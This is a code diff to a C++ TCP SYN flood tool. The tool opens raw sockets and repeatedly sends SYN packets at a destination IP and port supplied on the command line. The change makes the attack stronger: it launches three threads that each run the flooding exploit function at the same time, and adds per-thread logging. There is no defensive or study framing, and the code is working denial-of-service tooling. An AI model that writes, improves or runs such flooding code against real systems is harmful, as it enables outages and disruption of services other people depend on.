@@ -20,6 +20,8 @@ int main(int argc, char **argv)
     int opt; // To handle args
     unsigned int sleep_time = 10; // How long to sleep between two SYN packet launchs in ms
     int packet_to_send = -1;      // How many packets has to be sent, below 0 is unlimited
+    unsigned short threads_count = 3;
+    vector<thread> threads;
 
     // Clear IP buffers before writting
     memset(SRC_IP, 0, IP_SIZE);
@@ -60,7 +62,17 @@ int main(int argc, char **argv)
     if(strlen(SRC_IP) > 0 && strlen(DST_IP) > 0)
     {
         printf("Launching attack to %s:%d from %s every %d ms\n", DST_IP, DST_PORT, SRC_IP, sleep_time);
-        exploit(sleep_time, packet_to_send);
+        for(int i = 0; i < threads_count; i++)
+        {
+            std::thread th(exploit, sleep_time, packet_to_send);
+            threads.push_back(move(th));
+        }
+
+        for(thread &th : threads)
+        {
+            if(th.joinable())
+                th.join();
+        }
     }
     else
         printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -t <time to sleep in ms>\n");
@@ -72,6 +84,8 @@ void exploit(unsigned int time_to_sleep, int packet_to_send)
 {
     // Creating the socket and getting the file directory
     SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+
+    unsigned short th_id = get_rand();
 
     if (socket_fd == SOCKET_ERROR)
     {
@@ -121,6 +135,7 @@ void exploit(unsigned int time_to_sleep, int packet_to_send)
                 {
                     // Wait and increment
                     this_thread::sleep_for(chrono::milliseconds(time_to_sleep));
+                    cout << "Packet sent by thread " << th_id << endl;
                     packet_counter++;
                 }
             }
